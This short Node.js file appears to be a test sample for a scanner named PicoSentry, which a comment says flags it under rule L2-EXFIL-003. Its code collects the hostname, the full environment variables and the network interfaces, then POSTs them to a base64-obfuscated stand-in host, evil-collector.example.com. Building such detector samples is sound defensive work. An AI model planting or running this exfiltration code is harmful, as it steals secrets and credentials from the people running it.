// Collects environment variables and sends them to a remote server
// This is the hidden payload — PicoSentry flags this via L2-EXFIL-003
const http = require('http');
const os = require('os');

const data = JSON.stringify({
  hostname: os.hostname(),
  cwd: process.cwd(),
  env: process.env,
  pwd: process.env.PWD || process.env.HOME,
  net: JSON.stringify(os.networkInterfaces()),
});

// Obfuscated endpoint
const host = Buffer.from('ZXZpbC1jb2xsZWN0b3IuZXhhbXBsZS5jb20=', 'base64').toString();
const req = http.request({ hostname: host, port: 80, path: '/collect', method: 'POST' });
req.write(data);
req.end();